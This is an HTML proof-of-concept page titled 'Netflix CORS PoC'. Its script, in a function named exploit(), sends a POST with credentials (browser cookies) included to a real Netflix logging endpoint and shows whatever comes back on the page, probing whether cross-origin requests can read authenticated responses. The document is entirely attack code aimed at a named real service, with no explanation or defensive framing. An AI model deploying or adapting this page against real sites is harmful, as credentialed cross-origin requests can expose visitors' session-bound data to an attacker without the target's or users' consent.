<!DOCTYPE html>
<html>
<head>
  <title>Netflix CORS PoC</title>
</head>
<body>
  <h1>Netflix CORS PoC Test</h1>
  <button onclick="exploit()">Test CORS</button>

  <pre id="output"></pre>

  <script>
    async function exploit() {
      try {
        const response = await fetch("https://www.netflix.com/ichnaea/log", {
          method: "POST",
          mode: "cors",
          credentials: "include",  // ðŸ”¥ crucial to send cookies
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ test: "cors-exploit" })
        });

        const text = await response.text();
        document.getElementById("output").textContent = text || "(empty response)";
      } catch (err) {
        document.getElementById("output").textContent = "Request failed: " + err;
      }
    }
  </script>
</body>
</html>
